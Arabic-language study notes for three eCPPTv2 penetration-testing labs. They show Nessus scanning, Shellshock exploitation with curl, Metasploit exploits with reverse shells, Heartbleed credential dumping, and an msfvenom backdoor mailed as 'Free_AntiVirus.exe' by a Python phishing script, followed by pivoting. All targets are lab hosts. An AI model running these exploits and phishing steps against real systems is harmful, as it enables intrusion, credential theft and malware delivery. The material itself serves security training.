# Session 6 (eCPPTv2) - Day 6  
## Penetration Testing: Network Security  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نكمل من الي وقفنا عليه امس  

---

معنا اليوم باذن الله اول لاب  

ICMP Redirect attack  
---------------------|  

[just read]  


---  

VA and Exploitation  
--------------------|  

فكرة اللاب راح نستخدم Nessus  
طبعا هي اداة اوتيميشن تفحص لك كلشي كامل  

طيب خلونا ناكسس موقع الاداة او الاداة نفسها  
```bash
https://localhost:8834/  
```  

**Note: If you visit http://localhost:8834/ instead of HTTPS, then we would get the following page:**

طيب حلو نشوف انه فتح لنا صفحة تسجيل دخول  

نعرف ان الباسورد واليوزر الديفلوت لصفحة تسجيل دخول اداة Nessus هو  
```bash  
username: admin  
password: adminpasswd 
```  

طبعا نشوف انه طلب منا نسجل التارقت دومين او الايبي ونشوف  
```bash  
demo.ine.local  
demo2.ine.local  
demo3.ine.local  
demo4.ine.local  
```  

بعدين نسوي Run Scan  
ونشوف انه بدا يفحص ننتظره يخلص  
طبعا عندك فوق موضح الهوستات والثغرات الي حصلها والهيستوري وكم شي ثاني  
يهمنا منها الثغرات خلونا ندخل ناخذ نظره عليها  

نشوف انه حصلنا ثغره وحده حرجة (CRITICAL)  
وهي تخص خدمة الـ FTP  
طبعا نشوف انه عطانا انه فيه ثغرة RCE  

طيب خلونا الان نفحص يدوي وبنحصل اشياء Nessus ماطلعتها لنا  

اول شي خلونا نضيف التارقت في ملف جديد اسمه Hosts  
```bash  
printf 'demo2.ine.local\ndemo3.ine.local\ndemo4.ine.local\n' > hosts  
cat hosts  
```  

خلونا الان نفحص باستخدام الـ NMAP scan  
```bash  
nmap --script vuln -iL hosts  
```  

نشوف انه حصلنا SQLI  
وطبعا الاداة Nessus ماطلعت لنا هذي الثغره  
ف هذي احد عيوب الاوتوميشن مثلا يعطيك ثغره وهي مو موجوده او انه زي ماحصل معنا مايعطينا كامل الثغرات  


طيب خلونا الان نفحص الويب سيرفر  
```bash  
web server Domain= demo4.ine.local  
```  

طيب ندخل المتصفح ونفتح الدومين نشوف انه طالب ايميل عشان يعطيك اخر التحديثات للموقع  
طبعا لو نشوف فوق بالـ URI في مسار غريب الي هو  /browser.cgi  
طيب حنا نعرف انه الملفات الي امتدادها cgi غالبا مصابة بثغرة HTTP-shellshock  

خلونا نجرب نستغله  
```bash  
nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd=id demo4.ine.local  
```  

نشوف انه قالنا انه فيه خطا 500 وطبعا يفرق من ملف لملف حسب السيناريو ممكن تحتاج تعدل على
الـ Contant تبع الطلب او اي شي اخر على حسب السيناريو  

نجرب الان نعدل الـ Contant-Type  
```bash  
nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' demo4.ine.local  
```  

نشوف انه ضبط تمام الان وعطانا النتجية  
طبعا فيه فلاق خلونا نقراه بهذا الامر اختصار للوقت طلعنا المسار  
```bash  
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /tmp/flag'" http://demo4.ine.local/browser.cgi  
```  

طيب الان عطانا الفلاق خلونا نرجع لثغرة الاوتوميشن الان  

خلونا نجرب نستغل الثغرة الحرجة الي حصلتها لنا اداة Nessus  
```bash  
msfconsole -q  
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor  
show options  
ip addr  
set RHOSTS demo.ine.local  
set PAYLOAD cmd/unix/reverse_perl  
set LHOST 192.243.162.2  
exploit  
id  
cat /flag  
```  

نشوف انه فعلا استغلينا التارقت الي قالت لنا Nessus انه فيه ثغرة RCE  

طيب الان يوم فحصنا بالـ NMAP scan حصلنا بورت 1099 اوبن وقالنا انه مصاب بالثغره وعطانا رابط الاستغلال خلونا نجرب الان نستغله  
```bash  
msfconsole -q  
search java_rmi  
use exploit/multi/misc/java_rmi_server  
show options  
set RHOSTS demo2.ine.local  
set LHOST 192.243.162.2  
set HTTPDELAY 20  
exploit  
getuid  
sysinfo  
```  

نشوف انه فعلا الثغرة صحيحة وتم الاستغلال وصرنا الـ ROOT  

خلونا الان نستغل ثغرة الـ SQLi  
طبعا طلعها لنا بالـ nmap حصلنا cve 2012  
خلونا نجرب الان الاستغلال  
```bash
msfconsole -q  
search mysql_authbypass  
use auxiliary/scanner/mysql/mysql_authbypass_hashdump  
show options  
set RHOSTS demo3.ine.local  
exploit  
```  

ونشوف انه فعلا تم الاستغلال وسوينا بايباس للـ  MySQL authentication وقدرنا ناخذ الهاشات  

الى هنا انتهى اللاب نشوف الي بعده  

---  

Nessus  
------|  

في هذا اللاب نفس الي قبله تقريبا معطينا ثلاث تارقت يبينا نفحصهم بالـ Nessus  

خلونا نشوف اول هل نقدر نرسلهم كلهم ولا لا خلونا نسوي بنق  
```bash  
ping -c3 demo.ine.local  
ping -c3 demossl.ine.local  
ping -c3 webserver.ine.local  
```  
نشوف انه كل التارقت نقدر نوصلهم بدون اي مشاكل حلو  

الان نبدا نسوي الـ Nmap scanning  
```bash
nmap -sS -sV demo.ine.local demossl.ine.local webserver.ine.local  
```  
نشوف انه فيه بورتات مفتوحه معينه على كل تارقت منهم  
```bash
1. demo.ine.local: Ports 80 (Apache) and 3306 (MySQL) are open.  
2. demossl.ine.local: Ports 22 (SSH) and 443 (NGINX) are open.  
3. webserver.ine.local: Port 80 (Apache) is open.   
```  

خلونا ندخل على كل ويب ونشوف وش يشتغل على كل واحد فيهم  
1. bWAPP is hosted on demo.ine.local.   
2. custom website is hosted on demossl.ine.local.  
3. Apache's default web page is present on webserver.ine.local.  

طيب الان بعد ماعرفنا هذي المعلومات خلونا نروح لاداة الاوتوميشن Nessus  
ونعطيها التارقت الي عندنا  
اول شي نفتح الرابط هذا في المتصفح حقنا  
```bash
https://localhost:8834/  
```  
**Note: If you visit http://localhost:8834/ instead of HTTPS, then we would get the following page:**

نشوف انه ظهرت لنا صفحة تسجيل دخول خلونا نسجل باليوزر والباسورد هذا  
```bash  
Username: admin  
Password: adminpasswd   
```  

طيب حلو الان بنعطيه التارقت الي عندنا كلهم  
```bash
demo.ine.local demossl.ine.local webserver.ine.local  
```  
نحدد كل الثلاث هوستات ونختار  Run Scan  

ننتظره يخلص طبعا الان طبعا هو يتاخر شوي وهي فقط ثلاث دومينات او هوستات ف مابالك لو كانت شركة كامله ف ممكن ياخذ بالساعات والايام  

طبعا الان نشوف انه خلص الفحص وعطانا الثغرات الموجوده  

طبعا بعد ماخلص خلونا نشوف وش طلع لنا  
اول تارقت حصل 1 عاليه و 10 متوسطه و39 انفو  
خلونا نشوف الي طلعه لنا بالتارقت الاول  

طبعا من مميزات Nessus انه تقدر تربطه بالـ MSFconsole  
خلونا اول شي نشغل الداتابيس حقت الـ metasploit  
```bash  
service postgresql start  
```  
الان شغال تمام خلونا الان نفتح الـ MSFconsole  
```bash  
msfconsole -q  
```  
الان نشوف انه فتح معنا تمام  

خلونا نسوي load للـ Nessus ونعطيه اليووزر والباسورد عشان يتصل مع الداش بورد  
```bash  
load nessus  
nessus_connect admin:adminpasswd@localhost  
```  
طبعا الان عشان نشوف الاوامر حقت Nessus نقدر نكتب الامر التالي  
```bash  
nessus_help  
```  

حنا طبعا الي يهمنا هو امر nessus_scan_list  
طبعا وظيفته يعرض لك كل السكان الي صار داخل الـ Nessus  
```bash  
nessus_scan_list  
```  
طبعا نقدر نشوف السكان عن طريق انه نحدد الـ Scan ID  
```bash  
nessus_report_hosts 8  
```  
وبكذا عطانا الهوستات  

الان خلونا نشوف الثغرات الي حصلها لنا عن طريق هذا الامر  
```bash
nessus_report_vulns 8  
```  
نشوف انه عطانا الثغرات الي حصلها كلها  

نقدر كذالك نسوي import للتقرير  
```bash
nessus_db_import 8  
```  

بعد ماستدعينا الريبورت حقنا خلونا نشوف هل فعلا الـ MSFconsole سوت لنا import لتقرير او لا  
خلونا نشوف الثغرات عن طريق امر خاص بالـ msfconsole  
```bash  
vulns  
```  

طبعا نشوف انه حصلنا قغرة OpenSSL Heartbeat Information Disclosure (Heartbleed)  
خلونا نجرب نستغلها  
اول شي نبحث عن الاستغلال بعدها نستغل  
```bash  
search heartbleed  
use auxiliary/scanner/ssl/openssl_heartbleed  
show options  
set RHOSTS 192.7.13.4  
set VERBOSE true  
scan  
```  
طبعا نشوف انه ممكن نحصل يوزر وباسورد ممكن نحصل اشياء كثير لانه قدر يسوي memory dump  
طبعا حصلنا اكثر من creds  
طبعا نشوف انه الان حصلنا اكثر من يوزر وباسورد ونجرب نسجل دخول في الموقع  
```bash  
Username: amanda  
Password: rockstar  
```  
طبعا الان نجرب نسجل دخول في هذا التارقت https://demossl.ine.local  

نشوف انه سجل معنا دخول وحنا نعرف ان التارقت هذا مفتوح فيه بورت 22 الي هو الـ SSH  
خلونا نجرب نأكسس الـ SSH بنفس اليوزر والباسورد  
```bash
ssh amanda@demossl.ine.local  
password: rockstar  
```  
نشوف انه دخلنا تمام وكلشي حلو  

خلونا نرجع للـ Nessus وندخل من القائمة الي يسار My Scans  
بعدين فوق يمين نختار New Scan  
طيب الان خلونا نختار انه نبي Advanced Scan  
طيب الان ندخل على الـ Credentials  
ونظيف الـ SSH Creds  
طبعا من اول خيار نختار password  
بعدين نعطيه اليوزر والباسورد الي حصلناهم فوق  
طيب الان عشان بس نخلي السكان اسرع شوي نسوي هذي الخطوات Settings > Host Discovery وتفعل ثاني خيار تحت General Settings والاول تقفله  
وندخل على الـ Port Scanning ونفعل اول خيار ونحدد له بورتات معينه  
ومن تحت فيه Local Port Enumeration نفعل اول خيار SSH (netstat)  
الان فقط نسوي save ونشغل  
الان نخليه يفحص ونسوي حق الويب  

نروح للـ Scans من فوق  
بعدين نختار Web Application Tests  
بعدين نحدد التارقت في المربع النصي demo.ine.local and webserver.ine.local  
بعدين نروح للـ Settings > Discovery  
بعدين نختار خيار Assessments  
بعدين نحدد وش نوع السكان الي نبيه حنا بنخليه كويك سكان عشان مايتاخر علينا  
بعدي نسوي save ونشغله  

الان ننتظر كل الفحصين حق الشبكة وحق الويب يخلصون  

طيب حلو الان خلص خلونا نسوي export للتقرير  
ندخل على السكانات ونشوف اول واحد الي سميناه Custom WebApp Scan  
نشوف فوق يمين فيه Report Export نضغط عليه  
الان نختار كيف نبي نستخرجه هل ملف pdf or XML ot HTML  
حنا اخترنا PDF  
طبعا حنا نبي الريبورت كامل ف نختار Complete Lists Vulnerbilities bu Hosts  
بعدين نضغط Generate Report  

ونشوف انه الى هنا انهينا الـ Nessus كامل  
عرفنا كيف نسوي سكان عرفنا نضيف التارقت عرفنا نشوف نتيجة الفحص وعرفنا نصدر تقرير مرتب عن كل السكان الي صار موضح فيه كل شي صار بالسكان  

الى هنا انتهى اللاب نشوف الي بعده  

---  

Client-Side Exploitation  
-------------------------|  

طيب اول شي نسوي بنق نشوف وش الي نقدر نوصله ووش اتلي منقدر من التارقت  
```bash  
ping demo.ine.local  
ping demo1.ine.local  
```  

 خلونا نفحص التارقت  
```bash  
nmap demo.ine.local  
```  
نشوف انه عطانا بورتات كثير مفتوحه يهمنا منها بورت 25 SMTP  
طيب خلونا نفحص البورت هذا بالتحديد ونشوف اصدار الخدمة الي شغاله عليه  
```bash
nmap -sV -p 25 demo.ine.local  
```  
حلو الان عطانا انه شغال على hMailServer ونعرف انه مصاب  
خلونا نستغله الان لابد نسوي ملف باك دور  
```bash  
ip addr [ to identify your ip]  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=4444 -f exe > backdoor.exe file backdoor.exe  
```  
بعدين خلونا نفتح الليسنر على msfconsole  
```bash  
msfconsole -q  
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 10.10.15.4  
set LPORT 4444  
exploit  
```  
طيب حلو الان شغال الليسنر خلونا ناخذ البايثون سكربت الان  
```python  
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
fromaddr = "attacker@fake.net"
toaddr = "bob@ine.local"  
# instance of MIMEMultipart
msg = MIMEMultipart()
# storing the senders email address  
msg['From'] = fromaddr
# storing the receivers email address 
msg['To'] = toaddr
# storing the subject 
msg['Subject'] = "Subject of the Mail"
# string to store the body of the mail
body = "Body_of_the_mail"
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))
# open the file to be sent 
filename = "Free_AntiVirus.exe"
attachment = open("/root/backdoor.exe", "rb")
# instance of MIMEBase and named as p
p = MIMEBase('application', 'octet-stream')
# To change the payload into encoded form
p.set_payload((attachment).read())
# encode into base64
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
# attach the instance 'p' to instance 'msg'
msg.attach(p)
# creates SMTP session
s = smtplib.SMTP('demo.ine.local', 25)
# Converts the Multipart msg into a string
text = msg.as_string()
# sending the mail
s.sendmail(fromaddr, toaddr, text)
# terminating the session
s.quit()
```  
طبعا الان راح نرسل ملف الـ backdoor عن طريق سكربت البايثون  
```bash
nano send_email.py  
<Paste Code>  
python3 send_email.py  
```  
نشوف انه الان بعد مارسلناه رجعنا لليسنر ونشوف انه جانا شيل ووضعنا تمام التمام  

الان باقي جزئية البفتنق طبعا من الاول يوم نسوي بنق على التارقت فيه واحد منهم مافي اتصال ولا نقدر نسوي له بنق يعني ف بنحاول نسوي بفتنق  
طيب خلونا نجرب نسوي بنق الان من الجهاز الي استغليناه  
```bash  
shell  
ping demo1.ine.local  
```  

نشوف انه فعلا فيه رد من التارقت الثاني بعكس يوم كنا نسوي بنق من المشين حقتنا رافض ولا فيه اتصال  

خلونا الان نسوي بفتنق  
```bash  
CTRL + C  
y  
run autoroute -s 10.0.17.12/20  
```  
الان راح نستغله طبعا بالـ socks4a server  
```bash  
cat /etc/proxychains4.conf  
```  
خلونا الان نشغل السيرفر من الميتاسبلويت  
```bash  
background  
use auxiliary/server/socks_proxy  
show options  
```  
نحط المتغيرات المطلوبه  
```bash  
set SRVPORT 9050  
set VERSION 4a   
exploit  
jobs  
```
نشوف انه الان شغال بالخلفية  
خلونا الان نشوف نفحص البورتات  
```bash  
proxychains nmap demo1.ine.local -sT -Pn -p 1-100  
```  
الان الباقي نفس العاده نسوي portfwd ونستغل فورا  
راح اكتب اوامر الاستغلال دايركت  
```bash  
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.0.17.12
portfwd list  
```  
الان نفحص بالـ nmap  
```bash
nmap -sV -p 1234 localhost  
```  
نشوف انه شغال عليه badblue 2.7 نستغله  
```bash
bg
search badblue  
use exploit/windows/http/badblue_passthru
show options  
set RHOSTS demo1.ine.local
set PAYLOAD windows/meterpreter/bind_tcp
exploit
getuid
sysinfo  
```  
نشوف انه استنغليناه خلونا الان نقرا الفلاق المطلوب  
```bash
shell
dir C:\
type C:\FLAG1.txt
```  
ونشوف انه عطانا الفلاق  

الى هنا انتهى اللاب  
بكرا باذن الله راح نكمل  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  
